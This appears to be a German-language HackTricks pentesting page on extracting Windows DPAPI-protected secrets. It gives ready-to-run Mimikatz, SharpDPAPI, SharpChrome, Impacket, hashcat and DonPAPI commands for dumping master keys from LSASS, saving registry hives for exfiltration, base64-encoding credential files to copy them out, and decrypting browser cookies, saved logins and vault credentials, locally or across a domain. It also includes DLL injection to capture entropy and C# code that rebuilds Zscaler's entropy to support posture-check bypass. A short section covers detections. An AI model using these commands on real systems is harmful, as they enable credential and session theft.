# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle genutzt werden. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen erlaubt, Daten mit einem Schlüssel zu verschlüsseln, der aus den Logon-Geheimnissen des Benutzers oder — für Systemverschlüsselung — aus den Domain-Authentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch entfällt für Entwickler die Notwendigkeit, den Schutz des Verschlüsselungsschlüssels selbst zu verwalten.

Die gebräuchlichste Art, DPAPI zu verwenden, ist über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, die es Anwendungen ermöglichen, Daten sicher mit der Sitzung des aktuell angemeldeten Prozesses zu verschlüsseln und zu entschlüsseln. Das bedeutet, dass die verschlüsselten Daten nur vom selben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Außerdem akzeptieren diese Funktionen auch einen **`entropy` parameter**, der während der Verschlüsselung und Entschlüsselung verwendet wird. Um also etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, muss derselbe Entropie-Wert bereitgestellt werden, der bei der Verschlüsselung verwendet wurde.

### Generierung des Benutzerschlüssels

DPAPI erzeugt für jeden Benutzer einen eindeutigen Schlüssel (genannt **`pre-key`**) basierend auf dessen Anmeldeinformationen. Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet; der Algorithmus hängt vom Benutzertyp ab, führt aber letztlich zu einem SHA1. Zum Beispiel hängt er für Domain-Benutzer **vom NTLM-Hash des Benutzers** ab.

Das ist besonders interessant, denn wenn ein Angreifer den Passwort-Hash eines Benutzers erlangen kann, kann er:

- **Jegliche Daten entschlüsseln, die mit DPAPI** unter dem Schlüssel dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
- Versuchen, das Passwort offline zu **knacken**, indem er versucht, den gültigen DPAPI-Schlüssel zu erzeugen

Außerdem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **master key** erzeugt. Dieser Master-Key ist derjenige, der tatsächlich zur Verschlüsselung der Daten verwendet wird. Jeder Master-Key erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.

Die Master-Keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der Master-Key wird verschlüsselt durch den Benutzer-**`pre-key`** und zusätzlich durch einen **domain backup key** zur Wiederherstellung gespeichert (daher wird derselbe Schlüssel zwei Mal durch zwei verschiedene Passes verschlüsselt).

Beachte, dass der **domain key**, der zum Verschlüsseln des Master-Keys verwendet wird, in den Domain-Controllern liegt und sich nie ändert. Wenn ein Angreifer Zugriff auf den Domain-Controller hat, kann er den Domain-Backup-Key abrufen und die Master-Keys aller Benutzer in der Domain entschlüsseln.

Die verschlüsselten Blobs enthalten die **GUID des Master-Keys**, der zur Verschlüsselung der Daten verwendet wurde, in ihren Headern.

> [!TIP]
> DPAPI encrypted blobs beginnen mit **`01 00 00 00`**

Master-Keys finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System-Schlüsselgenerierung

Dies ist der Schlüssel, den die Maschine zum Verschlüsseln von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Schlüssel, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird verwendet, um Daten zu verschlüsseln, die für das System selbst zugänglich sein müssen, z. B. maschinenweite Anmeldeinformationen oder systemweite Secrets.

Beachte, dass diese Schlüssel **kein Domänen-Backup haben**, daher sind sie nur lokal zugänglich:

- **Mimikatz** kann darauf zugreifen, indem es die LSA secrets ausliest mit dem Befehl: `mimikatz lsadump::secrets`
- Das Secret wird in der Registry gespeichert, daher könnte ein Administrator die **DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registry-Pfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Ein Offline-Extrahieren aus Registry-Hives ist ebenfalls möglich. Zum Beispiel: als Administrator auf dem Ziel die Hives speichern und exfiltrieren:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Extrahiere auf deinem Analyse-Rechner das DPAPI_SYSTEM LSA secret aus den hives und verwende es, um machine-scope blobs zu entschlüsseln (Passwörter geplanter Tasks, Service-Anmeldeinformationen, Wi‑Fi-Profile usw.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Durch DPAPI geschützte Daten

Zu den durch DPAPI geschützten personenbezogenen Daten gehören:

- Windows-Anmeldeinformationen
- Passwörter und Autovervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Konto-Passwörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüssel
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und mehr
- Verschlüsselte Blobs in der Registry
- ...

Vom System geschützte Daten umfassen:
- WLAN-Passwörter
- Passwörter für geplante Aufgaben
- ...

### Master key extraction options

- Wenn der Benutzer Domain-Admin-Rechte hat, kann er auf den **domain backup key** zugreifen, um alle user master keys in der Domain zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Admin-Rechten ist es möglich, **auf den LSASS-Speicher zuzugreifen**, um die DPAPI-Masterkeys aller angemeldeten Benutzer und den SYSTEM-Key zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer lokale Administratorrechte hat, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Master-Schlüssel der Maschine zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kannst du **die Master Keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du dich in einer Sitzung als der Benutzer befindest, ist es möglich, den DC nach dem **backup key to decrypt the master keys using RPC** zu fragen. Wenn du local admin bist und der Benutzer eingeloggt ist, könntest du dafür **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Typische vom Benutzer **geschützte Dateien** befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe auch, ob in den obigen Pfaden `\Roaming\` durch `\Local\` ersetzt werden kann.

Beispiele zur Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um mit DPAPI sensible Daten wie cookies zu entschlüsseln.

#### Chromium/Edge/Electron Kurzanleitungen (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung von gespeicherten Anmeldedaten/cookies (funktioniert sogar mit Chrome 127+ app-bound cookies, weil der zusätzliche Schlüssel aus dem Credential Manager des Benutzers aufgelöst wird, wenn es im Benutzerkontext ausgeführt wird):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-Analyse, wenn du nur Dateien hast. Extrahiere zuerst den AES state key aus dem Profil "Local State" und verwende ihn dann, um die cookie DB zu entschlüsseln:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-weite/Remote-Triage, wenn Sie den DPAPI domain backup key (PVK) und admin auf dem target host haben:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Wenn Sie den DPAPI prekey/credkey eines Benutzers (aus LSASS) haben, können Sie password cracking überspringen und Profildaten direkt entschlüsseln:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Hinweise
- Neuere Chrome/Edge-Versionen können bestimmte Cookies mit "App-Bound"-Verschlüsselung speichern. Die Offline-Entschlüsselung dieser speziellen Cookies ist ohne den zusätzlichen app-bound key nicht möglich; starte SharpChrome im Kontext des Zielbenutzers, um ihn automatisch abzurufen. Siehe den weiter unten referenzierten Chrome security blog post.

### Zugangsschlüssel und Daten

- **Use SharpDPAPI** um Anmeldeinformationen aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung zu erhalten:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Get credentials info** wie die verschlüsselten Daten und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Auf masterkeys zugreifen**:

Entschlüsseln Sie einen masterkey eines Benutzers, der den **domain backup key** mithilfe von RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente zur Masterkey-Entschlüsselung (beachte, wie es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password` um ein Klartextpasswort zu verwenden, oder `/pvk` um eine DPAPI-Domänen-Privatschlüsseldatei anzugeben...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente für die `credentials|vaults|rdg|keepass|triage|blob|ps`-Entschlüsselung (achte darauf, dass es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domain zu erhalten, `/password`, um ein Klartext-Passwort zu verwenden, `/pvk`, um eine DPAPI-Domain-Private-Key-Datei anzugeben, `/unprotect`, um die aktuelle Benutzersitzung zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Verwendung eines DPAPI prekey/credkey direkt (kein Passwort erforderlich)

Wenn Sie LSASS dumpen können, offenbart Mimikatz häufig einen per-logon DPAPI key, mit dem sich die masterkeys des Benutzers entschlüsseln lassen, ohne das plaintext password zu kennen. Übergeben Sie diesen Wert direkt an das tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Entschlüssele einige Daten mit der **aktuellen Benutzersitzung**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline-Entschlüsselung mit Impacket dpapi.py

Wenn Sie die SID und das Passwort (oder NT hash) des Opfers haben, können Sie DPAPI masterkeys und Credential Manager blobs vollständig offline mit Impacket’s dpapi.py entschlüsseln.

- Artefakte auf dem Datenträger identifizieren:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Passender masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn Dateiübertragungstools unzuverlässig sind, base64-kodieren Sie die Dateien auf dem Host und kopieren Sie die Ausgabe:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Entschlüssle den masterkey mit der SID des Benutzers und dem password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Verwende den entschlüsselten masterkey, um den credential blob zu entschlüsseln:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Dieser Workflow stellt häufig Domänen-Anmeldeinformationen wieder her, die von Apps im Windows Credential Manager gespeichert wurden, einschließlich administrativer Konten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropy ("Third-party entropy")

Einige Anwendungen übergeben einen zusätzlichen **entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte masterkey bekannt ist. Das Beschaffen des entropy-Werts ist daher essentiell, wenn Credentials anvisiert werden, die auf diese Weise geschützt sind (z. B. Microsoft Outlook, einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine user-mode DLL, die die DPAPI-Funktionen im Zielprozess hookt und transparent alle optional übergebenen entropy-Werte aufzeichnet. Das Ausführen von EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` erzeugt eine Datei, die jeden entropy-Buffer dem aufrufenden Prozess und dem zugehörigen Blob zuordnet. Die erfasste entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft führte ein **context 3** masterkey-Format ab Windows 10 v1607 (2016) ein. `hashcat` v6.2.6 (Dezember 2023) fügte Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzer-Passwörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher word-list- oder brute-force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann außerdem Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.

### Auf Daten anderer Maschinen zugreifen

In **SharpDPAPI and SharpChrome** können Sie die Option **`/server:HOST`** angeben, um auf die Daten einer Remote-Maschine zuzugreifen. Natürlich müssen Sie auf diese Maschine zugreifen können; im folgenden Beispiel wird davon ausgegangen, dass der **Domain-Backup-Verschlüsselungsschlüssel bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Weitere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des domain controller backup key über RPC automatisiert. Das Skript löst dann die IP-Adressen aller Computer auf und führt smbclient auf allen Computern aus, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem domain backup key zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kann man jedes Subnetz finden, auch wenn man davon nichts wusste!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Geheimnisse auslesen. Die 2.x-Version brachte:

* Parallele Sammlung von Blobs von Hunderten Hosts
* Parsen von **context 3**-Masterkeys und automatische Integration mit Hashcat zum Cracken
* Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus zum wiederholten Abfragen von Endpunkten und Vergleichen neu erstellter Blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-/Credential-/Vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional Cracking automatisch starten kann. Er unterstützt vollständig Machine- und User-Masterkey-Formate bis Windows 11 24H1.


## Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Insbesondere von einem Netzwerkshare wie **C$** oder **ADMIN$**.
- Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* (Credential Manager) anfordert.

---
### 2023–2025 Verwundbarkeiten & Änderungen im Ökosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang konnte ein Domainmitglied dazu verleiten, einen bösartigen DPAPI backup key abzurufen, was die Entschlüsselung von User-Masterkeys ermöglichte. Im kumulativen Update vom November 2023 behoben – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.
* **Chrome 127 “App-Bound” cookie encryption** (Juli 2024) ersetzte den legacy DPAPI-only-Schutz durch einen zusätzlichen Schlüssel, der im Benutzer-**Credential Manager** gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI-Masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im Benutzerkontext ausgeführt werden.


### Fallstudie: Zscaler Client Connector – benutzerdefinierte Entropie, die aus der SID abgeleitet wird

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter liefert eine **benutzerdefinierte Entropie**, die zur Laufzeit berechnet wird, statt auf der Festplatte gespeichert zu werden.

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein hartkodiertes Geheimnis, das in `ZSACredentialProvider.dll` eingebettet ist.
2. Die **SID** des Windows-Kontos, dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jeder **device posture check** und ihres erwarteten Werts – Informationen, die beim Versuch von client-side bypasses sehr wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Privilegien erlangt wurden.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
